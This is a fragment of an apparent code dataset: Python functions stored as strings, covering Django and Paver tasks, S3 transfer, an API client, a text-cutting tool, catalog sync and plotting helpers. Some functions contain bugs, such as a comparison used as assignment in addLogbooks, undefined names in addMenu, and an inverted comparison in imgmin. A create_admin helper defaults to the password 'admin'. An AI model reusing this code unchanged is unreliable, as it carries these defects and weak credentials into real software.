            "def addLogbooks(self, type=None, logs=[], default=\"\"):\n        '''Add or change list of logbooks.'''\n        if type is not None and len(logs) != 0:\n            if type in self.logList:\n                for logbook in logs:\n                    if logbook not in self.logList.get(type)[0]:\n                        # print(\"Adding log \" + \" to \" + type + \" log type.\")\n                        self.logList.get(type)[0].append(logbook)\n            else:\n                # print(\"Adding log type: \" + type)\n                self.logList[type] = []\n                self.logList[type].append(logs)\n            \n            # If default given, auto-select upon menu creation\n            if len(self.logList[type]) > 1 and default != \"\":\n                self.logList.get(type)[1] == default\n            else:\n                self.logList.get(type).append(default)\n            \n            self.logType.clear()\n            self.logType.addItems(list(self.logList.keys()))\n            self.changeLogType()"
        ],
        [
            "def removeLogbooks(self, type=None, logs=[]):\n        '''Remove unwanted logbooks from list.'''\n        if type is not None and type in self.logList:\n            if len(logs) == 0 or logs == \"All\":\n                del self.logList[type]\n            else:\n                for logbook in logs:\n                    if logbook in self.logList[type]:\n                        self.logList[type].remove(logbook)\n            \n            self.changeLogType()"
        ],
        [
            "def changeLogType(self):\n        '''Populate log program list to correspond with log type selection.'''\n        logType = self.selectedType()\n        programs = self.logList.get(logType)[0]\n        default = self.logList.get(logType)[1]\n        if logType in self.logList:\n            self.programName.clear()\n            self.programName.addItems(programs)\n            self.programName.setCurrentIndex(programs.index(default))"
        ],
        [
            "def addMenu(self):\n        '''Add menus to parent gui.'''\n        self.parent.multiLogLayout.addLayout(self.logSelectLayout)\n        self.getPrograms(logType, programName)"
        ],
        [
            "def removeLayout(self, layout):\n        '''Iteratively remove graphical objects from layout.'''\n        for cnt in reversed(range(layout.count())):\n            item = layout.takeAt(cnt)\n            widget = item.widget()\n            if widget is not None:\n                widget.deleteLater()\n            else:\n                '''If sublayout encountered, iterate recursively.'''\n                self.removeLayout(item.layout())"
        ],
        [
            "def addlabel(ax=None, toplabel=None, xlabel=None, ylabel=None, zlabel=None, clabel=None, cb=None, windowlabel=None, fig=None, axes=None):\n    \"\"\"Adds labels to a plot.\"\"\"\n\n    if (axes is None) and (ax is not None):\n        axes = ax\n\n    if (windowlabel is not None) and (fig is not None):\n        fig.canvas.set_window_title(windowlabel)\n\n    if fig is None:\n        fig = _plt.gcf()\n\n    if fig is not None and axes is None:\n        axes = fig.get_axes()\n        if axes == []:\n            logger.error('No axes found!')\n\n    if axes is not None:\n        if toplabel is not None:\n            axes.set_title(toplabel)\n        if xlabel is not None:\n            axes.set_xlabel(xlabel)\n        if ylabel is not None:\n            axes.set_ylabel(ylabel)\n        if zlabel is not None:\n            axes.set_zlabel(zlabel)\n\n    if (clabel is not None) or (cb is not None):\n        if (clabel is not None) and (cb is not None):\n            cb.set_label(clabel)\n        else:\n            if clabel is None:\n                logger.error('Missing colorbar label')\n            else:\n                logger.error('Missing colorbar instance')"
        ],
        [
            "def linkcode_resolve(domain, info):\n    \"\"\"\n    Determine the URL corresponding to Python object\n    \"\"\"\n    if domain != 'py':\n        return None\n\n    modname = info['module']\n    fullname = info['fullname']\n\n    submod = sys.modules.get(modname)\n    if submod is None:\n        return None\n\n    obj = submod\n    for part in fullname.split('.'):\n        try:\n            obj = getattr(obj, part)\n        except:\n            return None\n\n    try:\n        fn = inspect.getsourcefile(obj)\n    except:\n        fn = None\n    if not fn:\n        return None\n\n    try:\n        source, lineno = inspect.getsourcelines(obj)\n    except:\n        lineno = None\n\n    if lineno:\n        linespec = \"#L%d-L%d\" % (lineno, lineno + len(source) - 1)\n    else:\n        linespec = \"\"\n\n    fn = relpath(fn, start=dirname(scisalt.__file__))\n\n    if 'dev' in scisalt.__version__:\n        return \"http://github.com/joelfrederico/SciSalt/blob/master/scisalt/%s%s\" % (\n            fn, linespec)\n    else:\n        return \"http://github.com/joelfrederico/SciSalt/blob/v%s/scisalt/%s%s\" % (\n            scisalt.__version__, fn, linespec)"
        ],
        [
            "def syncdb(args):\n    \"\"\"Update the database with model schema. Shorthand for `paver manage syncdb`.\n    \"\"\"\n    cmd = args and 'syncdb %s' % ' '.join(options.args) or 'syncdb --noinput'\n    call_manage(cmd)\n    for fixture in options.paved.django.syncdb.fixtures:\n        call_manage(\"loaddata %s\" % fixture)"
        ],
        [
            "def start(info):\n    \"\"\"Run the dev server.\n\n    Uses `django_extensions <http://pypi.python.org/pypi/django-extensions/0.5>`, if\n    available, to provide `runserver_plus`.\n\n    Set the command to use with `options.paved.django.runserver`\n    Set the port to use with `options.paved.django.runserver_port`\n    \"\"\"\n    cmd = options.paved.django.runserver\n\n    if cmd == 'runserver_plus':\n        try:\n            import django_extensions\n        except ImportError:\n            info(\"Could not import django_extensions. Using default runserver.\")\n            cmd = 'runserver'\n\n    port = options.paved.django.runserver_port\n    if port:\n        cmd = '%s %s' % (cmd, port)\n\n    call_manage(cmd)"
        ],
        [
            "def schema(args):\n    \"\"\"Run South's schemamigration command.\n    \"\"\"\n    try:\n        import south\n        cmd = args and 'schemamigration %s' % ' '.join(options.args) or 'schemamigration'\n        call_manage(cmd)\n    except ImportError:\n        error('Could not import south.')"
        ],
        [
            "def validate(cls, definition):\n        '''\n        This static method validates a BioMapMapper definition.\n        It returns None on success and throws an exception otherwise.\n        '''\n        schema_path = os.path.join(os.path.dirname(__file__),\n                                   '../../schema/mapper_definition_schema.json')\n        with open(schema_path, 'r') as jsonfp:\n            schema = json.load(jsonfp)\n        # Validation of JSON schema\n        jsonschema.validate(definition, schema)\n        # Validation of JSON properties relations\n        assert definition['main_key'] in definition['supported_keys'], \\\n               '\\'main_key\\' must be contained in \\'supported_keys\\''\n        assert set(definition.get('list_valued_keys', [])) <= set(definition['supported_keys']), \\\n               '\\'list_valued_keys\\' must be a subset of \\'supported_keys\\''\n        assert set(definition.get('disjoint', [])) <= set(definition.get('list_valued_keys', [])), \\\n               '\\'disjoint\\' must be a subset of \\'list_valued_keys\\''\n        assert set(definition.get('key_synonyms', {}).values()) <= set(definition['supported_keys']), \\\n               '\\'The values of the \\'key_synonyms\\' mapping must be in \\'supported_keys\\''"
        ],
        [
            "def map(self, ID_s,\n                  FROM=None,\n                  TO=None,\n                  target_as_set=False,\n                  no_match_sub=None):\n        '''\n        The main method of this class and the essence of the package.\n        It allows to \"map\" stuff.\n\n        Args:\n\n            ID_s: Nested lists with strings as leafs (plain strings also possible)\n            FROM (str): Origin key for the mapping (default: main key)\n            TO (str): Destination key for the mapping (default: main key)\n            target_as_set (bool): Whether to summarize the output as a set (removes duplicates)\n            no_match_sub: Object representing the status of an ID not being able to be matched\n                          (default: None)\n\n        Returns:\n\n            Mapping: a mapping object capturing the result of the mapping request\n        '''\n        def io_mode(ID_s):\n            '''\n            Handles the input/output modalities of the mapping.\n            '''\n            unlist_return = False\n            list_of_lists = False\n            if isinstance(ID_s, str):\n                ID_s = [ID_s]\n                unlist_return = True\n            elif isinstance(ID_s, list):\n                if len(ID_s) > 0 and isinstance(ID_s[0], list):\n                    # assuming ID_s is a list of lists of ID strings\n                    list_of_lists = True\n            return ID_s, unlist_return, list_of_lists\n\n        # interpret input\n        if FROM == TO:\n            return ID_s\n        ID_s, unlist_return, list_of_lists = io_mode(ID_s)\n        # map consistent with interpretation of input\n        if list_of_lists:\n            mapped_ids = [self.map(ID, FROM, TO, target_as_set, no_match_sub) for ID in ID_s]\n        else:\n            mapped_ids = self._map(ID_s, FROM, TO, target_as_set, no_match_sub)\n        # return consistent with interpretation of input\n        if unlist_return:\n            return mapped_ids[0]\n        return Mapping(ID_s, mapped_ids)"
        ],
        [
            "def get_all(self, key=None):\n        '''\n        Returns all data entries for a particular key. Default is the main key.\n\n        Args:\n\n            key (str): key whose values to return (default: main key)\n\n        Returns:\n\n            List of all data entries for the key\n        '''\n        key = self.definition.main_key if key is None else key\n        key = self.definition.key_synonyms.get(key, key)\n        entries = self._get_all(key)\n        if key in self.definition.scalar_nonunique_keys:\n            return set(entries)\n        return entries"
        ],
        [
            "def line(self, line):\n        \"\"\"Returns list of strings split by input delimeter\n\n        Argument:\n        line - Input line to cut\n        \"\"\"\n        # Remove empty strings in case of multiple instances of delimiter\n        return [x for x in re.split(self.delimiter, line.rstrip()) if x != '']"
        ],
        [
            "def get_message(self, message_id):\n        \"\"\"\n        Get Existing Message\n\n        http://dev.wheniwork.com/#get-existing-message\n        \"\"\"\n        url = \"/2/messages/%s\" % message_id\n\n        return self.message_from_json(self._get_resource(url)[\"message\"])"
        ],
        [
            "def create_message(self, params={}):\n        \"\"\"\n        Creates a message\n\n        http://dev.wheniwork.com/#create/update-message\n        \"\"\"\n        url = \"/2/messages/\"\n        body = params\n\n        data = self._post_resource(url, body)\n        return self.message_from_json(data[\"message\"])"
        ],
        [
            "def update_message(self, message):\n        \"\"\"\n        Modify an existing message.\n\n        http://dev.wheniwork.com/#create/update-message\n        \"\"\"\n        url = \"/2/messages/%s\" % message.message_id\n\n        data = self._put_resource(url, message.json_data())\n        return self.message_from_json(data)"
        ],
        [
            "def delete_messages(self, messages):\n        \"\"\"\n        Delete existing messages.\n\n        http://dev.wheniwork.com/#delete-existing-message\n        \"\"\"\n        url = \"/2/messages/?%s\" % urlencode([('ids', \",\".join(messages))])\n\n        data = self._delete_resource(url)\n        return data"
        ],
        [
            "def get_site(self, site_id):\n        \"\"\"\n        Returns site data.\n\n        http://dev.wheniwork.com/#get-existing-site\n        \"\"\"\n        url = \"/2/sites/%s\" % site_id\n\n        return self.site_from_json(self._get_resource(url)[\"site\"])"
        ],
        [
            "def get_sites(self):\n        \"\"\"\n        Returns a list of sites.\n\n        http://dev.wheniwork.com/#listing-sites\n        \"\"\"\n        url = \"/2/sites\"\n\n        data = self._get_resource(url)\n        sites = []\n        for entry in data['sites']:\n            sites.append(self.site_from_json(entry))\n\n        return sites"
        ],
        [
            "def create_site(self, params={}):\n        \"\"\"\n        Creates a site\n\n        http://dev.wheniwork.com/#create-update-site\n        \"\"\"\n        url = \"/2/sites/\"\n        body = params\n\n        data = self._post_resource(url, body)\n        return self.site_from_json(data[\"site\"])"
        ],
        [
            "def admin_link_move_up(obj, link_text='up'):\n    \"\"\"Returns a link to a view that moves the passed in object up in rank.\n\n    :param obj:\n        Object to move\n    :param link_text:\n        Text to display in the link.  Defaults to \"up\"\n    :returns:\n        HTML link code to view for moving the object\n    \"\"\"\n    if obj.rank == 1:\n        return ''\n\n    content_type = ContentType.objects.get_for_model(obj)\n    link = reverse('awl-rankedmodel-move', args=(content_type.id, obj.id, \n        obj.rank - 1))\n\n    return '<a href=\"%s\">%s</a>' % (link, link_text)"
        ],
        [
            "def admin_link_move_down(obj, link_text='down'):\n    \"\"\"Returns a link to a view that moves the passed in object down in rank.\n\n    :param obj:\n        Object to move\n    :param link_text:\n        Text to display in the link.  Defaults to \"down\"\n    :returns:\n        HTML link code to view for moving the object\n    \"\"\"\n    if obj.rank == obj.grouped_filter().count():\n        return ''\n\n    content_type = ContentType.objects.get_for_model(obj)\n    link = reverse('awl-rankedmodel-move', args=(content_type.id, obj.id, \n        obj.rank + 1))\n\n    return '<a href=\"%s\">%s</a>' % (link, link_text)"
        ],
        [
            "def showfig(fig, aspect=\"auto\"):\n    \"\"\"\n    Shows a figure with a typical orientation so that x and y axes are set up as expected.\n    \"\"\"\n\n    ax = fig.gca()\n\n    # Swap y axis if needed\n    alim = list(ax.axis())\n    if alim[3] < alim[2]:\n        temp    = alim[2]\n        alim[2] = alim[3]\n        alim[3] = temp\n        ax.axis(alim)\n\n    ax.set_aspect(aspect)\n    fig.show()"
        ],
        [
            "def _setup_index(index):\n    \"\"\"Shifts indicies as needed to account for one based indexing\n\n    Positive indicies need to be reduced by one to match with zero based\n    indexing.\n\n    Zero is not a valid input, and as such will throw a value error.\n\n    Arguments:\n        index -     index to shift\n    \"\"\"\n    index = int(index)\n    if index > 0:\n        index -= 1\n    elif index == 0:\n        # Zero indicies should not be allowed by default.\n        raise ValueError\n    return index"
        ],
        [
            "def cut(self, line):\n        \"\"\"Returns selected positions from cut input source in desired\n        arrangement.\n\n        Argument:\n            line -      input to cut\n        \"\"\"\n        result = []\n        line = self.line(line)\n\n        for i, field in enumerate(self.positions):\n            try:\n                index = _setup_index(field)\n                try:\n                    result += line[index]\n                except IndexError:\n                    result.append(self.invalid_pos)\n            except ValueError:\n                result.append(str(field))\n            except TypeError:\n                result.extend(self._cut_range(line, int(field[0]), i))\n\n        return ''.join(result)"
        ],
        [
            "def _setup_positions(self, positions):\n        \"\"\"Processes positions to account for ranges\n\n        Arguments:\n            positions -     list of positions and/or ranges to process\n        \"\"\"\n        updated_positions = []\n\n        for i, position in enumerate(positions):\n            ranger = re.search(r'(?P<start>-?\\d*):(?P<end>\\d*)', position)\n\n            if ranger:\n                if i > 0:\n                    updated_positions.append(self.separator)\n                start = group_val(ranger.group('start'))\n                end = group_val(ranger.group('end'))\n\n                if start and end:\n                    updated_positions.extend(self._extendrange(start, end + 1))\n                # Since the number of positions on a line is unknown,\n                # send input to cause exception that can be caught and call\n                # _cut_range helper function\n                elif ranger.group('start'):\n                    updated_positions.append([start])\n                else:\n                    updated_positions.extend(self._extendrange(1, end + 1))\n            else:\n                updated_positions.append(positions[i])\n                try:\n                    if int(position) and int(positions[i+1]):\n                        updated_positions.append(self.separator)\n                except (ValueError, IndexError):\n                    pass\n\n        return updated_positions"
        ],
        [
            "def _cut_range(self, line, start, current_position):\n        \"\"\"Performs cut for range from start position to end\n\n        Arguments:\n            line -              input to cut\n            start -             start of range\n            current_position -  current position in main cut function\n        \"\"\"\n        result = []\n        try:\n            for j in range(start, len(line)):\n                index = _setup_index(j)\n                try:\n                    result.append(line[index])\n                except IndexError:\n                    result.append(self.invalid_pos)\n                finally:\n                    result.append(self.separator)\n            result.append(line[-1])\n        except IndexError:\n            pass\n\n        try:\n            int(self.positions[current_position+1])\n            result.append(self.separator)\n        except (ValueError, IndexError):\n            pass\n\n        return result"
        ],
        [
            "def _extendrange(self, start, end):\n        \"\"\"Creates list of values in a range with output delimiters.\n\n        Arguments:\n            start -     range start\n            end -       range end\n        \"\"\"\n        range_positions = []\n        for i in range(start, end):\n            if i != 0:\n                range_positions.append(str(i))\n            if i < end:\n                range_positions.append(self.separator)\n        return range_positions"
        ],
        [
            "def lock_file(filename):\n    \"\"\"Locks the file by writing a '.lock' file.\n       Returns True when the file is locked and\n       False when the file was locked already\"\"\"\n\n    lockfile = \"%s.lock\"%filename\n    if isfile(lockfile):\n        return False\n    else:\n        with open(lockfile, \"w\"):\n            pass\n    return True"
        ],
        [
            "def unlock_file(filename):\n    \"\"\"Unlocks the file by remove a '.lock' file.\n       Returns True when the file is unlocked and\n       False when the file was unlocked already\"\"\"\n\n    lockfile = \"%s.lock\"%filename\n    if isfile(lockfile):\n        os.remove(lockfile)\n        return True\n    else:\n        return False"
        ],
        [
            "def cmd_init_push_to_cloud(args):\n    \"\"\"Initiate the local catalog and push it the cloud\"\"\"\n\n    (lcat, ccat) = (args.local_catalog, args.cloud_catalog)\n    logging.info(\"[init-push-to-cloud]: %s => %s\"%(lcat, ccat))\n\n    if not isfile(lcat):\n        args.error(\"[init-push-to-cloud] The local catalog does not exist: %s\"%lcat)\n    if isfile(ccat):\n        args.error(\"[init-push-to-cloud] The cloud catalog already exist: %s\"%ccat)\n\n    (lmeta, cmeta) = (\"%s.lrcloud\"%lcat, \"%s.lrcloud\"%ccat)\n    if isfile(lmeta):\n        args.error(\"[init-push-to-cloud] The local meta-data already exist: %s\"%lmeta)\n    if isfile(cmeta):\n        args.error(\"[init-push-to-cloud] The cloud meta-data already exist: %s\"%cmeta)\n\n    #Let's \"lock\" the local catalog\n    logging.info(\"Locking local catalog: %s\"%(lcat))\n    if not lock_file(lcat):\n        raise RuntimeError(\"The catalog %s is locked!\"%lcat)\n\n    #Copy catalog from local to cloud, which becomes the new \"base\" changeset\n    util.copy(lcat, ccat)\n\n    # Write meta-data both to local and cloud\n    mfile = MetaFile(lmeta)\n    utcnow = datetime.utcnow().strftime(DATETIME_FORMAT)[:-4]\n    mfile['catalog']['hash'] = hashsum(lcat)\n    mfile['catalog']['modification_utc'] = utcnow\n    mfile['catalog']['filename'] = lcat\n    mfile['last_push']['filename'] = ccat\n    mfile['last_push']['hash'] = hashsum(lcat)\n    mfile['last_push']['modification_utc'] = utcnow\n    mfile.flush()\n    mfile = MetaFile(cmeta)\n    mfile['changeset']['is_base'] = True\n    mfile['changeset']['hash'] = hashsum(lcat)\n    mfile['changeset']['modification_utc'] = utcnow\n    mfile['changeset']['filename'] = basename(ccat)\n    mfile.flush()\n\n    #Let's copy Smart Previews\n    if not args.no_smart_previews:\n        copy_smart_previews(lcat, ccat, local2cloud=True)\n\n    #Finally,let's unlock the catalog files\n    logging.info(\"Unlocking local catalog: %s\"%(lcat))\n    unlock_file(lcat)\n\n    logging.info(\"[init-push-to-cloud]: Success!\")"
        ],
        [
            "def cmd_init_pull_from_cloud(args):\n    \"\"\"Initiate the local catalog by downloading the cloud catalog\"\"\"\n\n    (lcat, ccat) = (args.local_catalog, args.cloud_catalog)\n    logging.info(\"[init-pull-from-cloud]: %s => %s\"%(ccat, lcat))\n\n    if isfile(lcat):\n        args.error(\"[init-pull-from-cloud] The local catalog already exist: %s\"%lcat)\n    if not isfile(ccat):\n        args.error(\"[init-pull-from-cloud] The cloud catalog does not exist: %s\"%ccat)\n\n    (lmeta, cmeta) = (\"%s.lrcloud\"%lcat, \"%s.lrcloud\"%ccat)\n    if isfile(lmeta):\n        args.error(\"[init-pull-from-cloud] The local meta-data already exist: %s\"%lmeta)\n    if not isfile(cmeta):\n        args.error(\"[init-pull-from-cloud] The cloud meta-data does not exist: %s\"%cmeta)\n\n    #Let's \"lock\" the local catalog\n    logging.info(\"Locking local catalog: %s\"%(lcat))\n    if not lock_file(lcat):\n        raise RuntimeError(\"The catalog %s is locked!\"%lcat)\n\n    #Copy base from cloud to local\n    util.copy(ccat, lcat)\n\n    #Apply changesets\n    cloudDAG = ChangesetDAG(ccat)\n    path = cloudDAG.path(cloudDAG.root.hash, cloudDAG.leafs[0].hash)\n    util.apply_changesets(args, path, lcat)\n\n    # Write meta-data both to local and cloud\n    mfile = MetaFile(lmeta)\n    utcnow = datetime.utcnow().strftime(DATETIME_FORMAT)[:-4]\n    mfile['catalog']['hash'] = hashsum(lcat)\n    mfile['catalog']['modification_utc'] = utcnow\n    mfile['catalog']['filename'] = lcat\n    mfile['last_push']['filename'] = cloudDAG.leafs[0].mfile['changeset']['filename']\n    mfile['last_push']['hash'] = cloudDAG.leafs[0].mfile['changeset']['hash']\n    mfile['last_push']['modification_utc'] = cloudDAG.leafs[0].mfile['changeset']['modification_utc']\n    mfile.flush()\n\n    #Let's copy Smart Previews\n    if not args.no_smart_previews:\n        copy_smart_previews(lcat, ccat, local2cloud=False)\n\n    #Finally, let's unlock the catalog files\n    logging.info(\"Unlocking local catalog: %s\"%(lcat))\n    unlock_file(lcat)\n\n    logging.info(\"[init-pull-from-cloud]: Success!\")"
        ],
        [
            "def path(self, a_hash, b_hash):\n        \"\"\"Return nodes in the path between 'a' and 'b' going from\n        parent to child NOT including 'a' \"\"\"\n\n        def _path(a, b):\n            if a is b:\n                return [a]\n            else:\n                assert len(a.children) == 1\n                return [a] + _path(a.children[0], b)\n\n        a = self.nodes[a_hash]\n        b = self.nodes[b_hash]\n        return _path(a, b)[1:]"
        ],
        [
            "def _rindex(mylist: Sequence[T], x: T) -> int:\n    \"\"\"Index of the last occurrence of x in the sequence.\"\"\"\n    return len(mylist) - mylist[::-1].index(x) - 1"
        ],
        [
            "def create_admin(username='admin', email='admin@admin.com', password='admin'):\n    \"\"\"Create and save an admin user.\n\n    :param username:\n        Admin account's username.  Defaults to 'admin'\n    :param email:\n        Admin account's email address.  Defaults to 'admin@admin.com'\n    :param password:\n        Admin account's password.  Defaults to 'admin'\n    :returns:\n        Django user with staff and superuser privileges\n    \"\"\"\n    admin = User.objects.create_user(username, email, password)\n    admin.is_staff = True\n    admin.is_superuser = True\n    admin.save()\n    return admin"
        ],
        [
            "def messages_from_response(response):\n    \"\"\"Returns a list of the messages from the django MessageMiddleware\n    package contained within the given response.  This is to be used during\n    unit testing when trying to see if a message was set properly in a view.\n\n    :param response: HttpResponse object, likely obtained through a\n        test client.get() or client.post() call\n\n    :returns: a list of tuples (message_string, message_level), one for each\n        message in the response context\n    \"\"\"\n    messages = []\n    if hasattr(response, 'context') and response.context and \\\n            'messages' in response.context:\n        messages = response.context['messages']\n    elif hasattr(response, 'cookies'):\n        # no \"context\" set-up or no messages item, check for message info in\n        # the cookies\n        morsel = response.cookies.get('messages')\n        if not morsel:\n            return []\n\n        # use the decoder in the CookieStore to process and get a list of\n        # messages\n        from django.contrib.messages.storage.cookie import CookieStorage\n        store = CookieStorage(FakeRequest())\n        messages = store._decode(morsel.value)\n    else:\n        return []\n\n    return [(m.message, m.level) for m in messages]"
        ],
        [
            "def authorize(self):\n        \"\"\"Authenticates the superuser account via the web login.\"\"\"\n        response = self.client.login(username=self.USERNAME, \n            password=self.PASSWORD)\n        self.assertTrue(response)\n        self.authed = True"
        ],
        [
            "def authed_get(self, url, response_code=200, headers={}, follow=False):\n        \"\"\"Does a django test client ``get`` against the given url after\n        logging in the admin first.\n\n        :param url:\n            URL to fetch\n        :param response_code:\n            Expected response code from the URL fetch.  This value is\n            asserted.  Defaults to 200\n        :param headers:\n            Optional dictionary of headers to send in the request\n        :param follow:\n            When True, the get call will follow any redirect requests.\n            Defaults to False.\n        :returns:\n            Django testing ``Response`` object\n        \"\"\"\n        if not self.authed:\n            self.authorize()\n\n        response = self.client.get(url, follow=follow, **headers)\n        self.assertEqual(response_code, response.status_code)\n        return response"
        ],
        [
            "def authed_post(self, url, data, response_code=200, follow=False,\n            headers={}):\n        \"\"\"Does a django test client ``post`` against the given url after\n        logging in the admin first.\n\n        :param url:\n            URL to fetch\n        :param data:\n            Dictionary to form contents to post\n        :param response_code:\n            Expected response code from the URL fetch.  This value is\n            asserted.  Defaults to 200\n        :param headers:\n            Optional dictionary of headers to send in with the request\n        :returns:\n            Django testing ``Response`` object\n        \"\"\"\n        if not self.authed:\n            self.authorize()\n\n        response = self.client.post(url, data, follow=follow, **headers)\n        self.assertEqual(response_code, response.status_code)\n        return response"
        ],
        [
            "def field_value(self, admin_model, instance, field_name):\n        \"\"\"Returns the value displayed in the column on the web interface for\n        a given instance.\n\n        :param admin_model:\n            Instance of a :class:`admin.ModelAdmin` object that is responsible\n            for displaying the change list\n        :param instance:\n            Object instance that is the row in the admin change list\n        :field_name:\n            Name of the field/column to fetch\n        \"\"\"\n        _, _, value = lookup_field(field_name, instance, admin_model)\n        return value"
        ],
        [
            "def imgmax(self):\n        \"\"\"\n        Highest value of input image.\n        \"\"\"\n        if not hasattr(self, '_imgmax'):\n            imgmax = _np.max(self.images[0])\n            for img in self.images:\n                imax = _np.max(img)\n                if imax > imgmax:\n                    imgmax = imax\n\n            self._imgmax = imgmax\n\n        return self._imgmax"
        ],
        [
            "def imgmin(self):\n        \"\"\"\n        Lowest value of input image.\n        \"\"\"\n        if not hasattr(self, '_imgmin'):\n            imgmin = _np.min(self.images[0])\n            for img in self.images:\n                imin = _np.min(img)\n                if imin > imgmin:\n                    imgmin = imin\n\n            self._imgmin = imgmin\n        return _np.min(self.image)"
        ],
        [
            "def spawn(func, *args, **kwargs):\n    \"\"\" spawns a greenlet that does not print exceptions to the screen.\n    if you use this function you MUST use this module's join or joinall otherwise the exception will be lost \"\"\"\n    return gevent.spawn(wrap_uncaught_greenlet_exceptions(func), *args, **kwargs)"
        ],
        [
            "def _usage(prog_name=os.path.basename(sys.argv[0])):\n    '''Returns usage string with no trailing whitespace.'''\n    spacer = ' ' * len('usage: ')\n    usage = prog_name + ' -b LIST [-S SEPARATOR] [file ...]\\n' \\\n       + spacer + prog_name + ' -c LIST [-S SEPERATOR] [file ...]\\n' \\\n       + spacer + prog_name \\\n       + ' -f LIST [-d DELIM] [-e] [-S SEPERATOR] [-s] [file ...]'\n\n    # Return usage message with trailing whitespace removed.\n    return \"usage: \" + usage.rstrip()"
        ],
        [
            "def _parse_args(args):\n    \"\"\"Setup argparser to process arguments and generate help\"\"\"\n\n    # parser uses custom usage string, with 'usage: ' removed, as it is\n    # added automatically via argparser.\n    parser = argparse.ArgumentParser(description=\"Remove and/or rearrange \"\n                                     + \"sections from each line of a file(s).\",\n                                     usage=_usage()[len('usage: '):])\n    parser.add_argument('-b', \"--bytes\", action='store', type=lst, default=[],\n                        help=\"Bytes to select\")\n    parser.add_argument('-c', \"--chars\", action='store', type=lst, default=[],\n                        help=\"Character to select\")\n    parser.add_argument('-f', \"--fields\", action='store', type=lst, default=[],\n                        help=\"Fields to select\")\n    parser.add_argument('-d', \"--delimiter\", action='store', default=\"\\t\",\n                        help=\"Sets field delimiter(default is TAB)\")\n    parser.add_argument('-e', \"--regex\", action='store_true',\n                        help='Enable regular expressions to be used as input '+\n                        'delimiter')\n    parser.add_argument('-s', '--skip', action='store_true',\n                        help=\"Skip lines that do not contain input delimiter.\")\n    parser.add_argument('-S', \"--separator\", action='store', default=\"\\t\",\n                        help=\"Sets field separator for output.\")\n    parser.add_argument('file', nargs='*', default=\"-\",\n                        help=\"File(s) to cut\")\n\n    return parser.parse_args(args)"
        ],
        [
            "def open_s3(bucket):\n    \"\"\"\n    Opens connection to S3 returning bucket and key\n    \"\"\"\n    conn = boto.connect_s3(options.paved.s3.access_id, options.paved.s3.secret)\n    try:\n        bucket = conn.get_bucket(bucket)\n    except boto.exception.S3ResponseError:\n        bucket = conn.create_bucket(bucket)\n    return bucket"
        ],
        [
            "def upload_s3(file_path, bucket_name, file_key, force=False, acl='private'):\n    \"\"\"Upload a local file to S3.\n    \"\"\"\n    file_path = path(file_path)\n    bucket = open_s3(bucket_name)\n\n    if file_path.isdir():\n        # Upload the contents of the dir path.\n        paths = file_path.listdir()\n        paths_keys = list(zip(paths, ['%s/%s' % (file_key, p.name) for p in paths]))\n    else:\n        # Upload just the given file path.\n        paths_keys = [(file_path, file_key)]\n\n    for p, k in paths_keys:\n        headers = {}\n        s3_key = bucket.get_key(k)\n        if not s3_key:\n            from boto.s3.key import Key\n            s3_key = Key(bucket, k)\n\n        content_type = mimetypes.guess_type(p)[0]\n        if content_type:\n            headers['Content-Type'] = content_type\n        file_size = p.stat().st_size\n        file_data = p.bytes()\n        file_md5, file_md5_64 = s3_key.get_md5_from_hexdigest(hashlib.md5(file_data).hexdigest())\n\n        # Check the hash.\n        if s3_key.etag:\n            s3_md5 = s3_key.etag.replace('\"', '')\n            if s3_md5 == file_md5:\n                info('Hash is the same. Skipping %s' % file_path)\n                continue\n            elif not force:\n                # Check if file on S3 is older than local file.\n                s3_datetime = datetime.datetime(*time.strptime(\n                    s3_key.last_modified, '%a, %d %b %Y %H:%M:%S %Z')[0:6])\n                local_datetime = datetime.datetime.utcfromtimestamp(p.stat().st_mtime)\n                if local_datetime < s3_datetime:\n                    info(\"File %s hasn't been modified since last \" \\\n                         \"being uploaded\" % (file_key))\n                    continue\n        # File is newer, let's process and upload\n        info(\"Uploading %s...\" % (file_key))\n\n        try:\n            s3_key.set_contents_from_string(file_data, headers, policy=acl, replace=True, md5=(file_md5, file_md5_64))\n        except Exception as e:\n            error(\"Failed: %s\" % e)\n            raise"
        ],
        [
            "def download_s3(bucket_name, file_key, file_path, force=False):\n    \"\"\"Download a remote file from S3.\n    \"\"\"\n    file_path = path(file_path)\n    bucket = open_s3(bucket_name)\n\n    file_dir = file_path.dirname()\n    file_dir.makedirs()\n\n    s3_key = bucket.get_key(file_key)\n    if file_path.exists():\n        file_data = file_path.bytes()\n        file_md5, file_md5_64 = s3_key.get_md5_from_hexdigest(hashlib.md5(file_data).hexdigest())\n\n        # Check the hash.\n        try:\n            s3_md5 = s3_key.etag.replace('\"', '')\n        except KeyError:\n            pass\n        else:\n            if s3_md5 == file_md5:\n                info('Hash is the same. Skipping %s' % file_path)\n                return\n\n            elif not force:\n                # Check if file on S3 is older than local file.\n                s3_datetime = datetime.datetime(*time.strptime(\n                    s3_key.last_modified, '%a, %d %b %Y %H:%M:%S %Z')[0:6])\n                local_datetime = datetime.datetime.utcfromtimestamp(file_path.stat().st_mtime)\n                if s3_datetime < local_datetime:\n                    info(\"File at %s is less recent than the local version.\" % (file_key))\n                    return\n\n    # If it is newer, let's process and upload\n    info(\"Downloading %s...\" % (file_key))\n\n    try:\n        with open(file_path, 'w') as fo:\n            s3_key.get_contents_to_file(fo)\n    except Exception as e:\n        error(\"Failed: %s\" % e)\n        raise"
        ],
        [
            "def create_ical(request, slug):\n    \"\"\" Creates an ical .ics file for an event using python-card-me. \"\"\"\n    event = get_object_or_404(Event, slug=slug)\n    # convert dates to datetimes.\n    # when we change code to datetimes, we won't have to do this.\n    start = event.start_date\n    start = datetime.datetime(start.year, start.month, start.day)\n\n    if event.end_date:\n        end = event.end_date\n        end = datetime.datetime(end.year, end.month, end.day)\n    else:\n        end = start\n\n    cal = card_me.iCalendar()\n    cal.add('method').value = 'PUBLISH'\n    vevent = cal.add('vevent')\n    vevent.add('dtstart').value = start\n    vevent.add('dtend').value = end\n    vevent.add('dtstamp').value = datetime.datetime.now()\n    vevent.add('summary').value = event.name\n    response = HttpResponse(cal.serialize(), content_type='text/calendar')\n    response['Filename'] = 'filename.ics'\n    response['Content-Disposition'] = 'attachment; filename=filename.ics'\n    return response"
        ],
        [
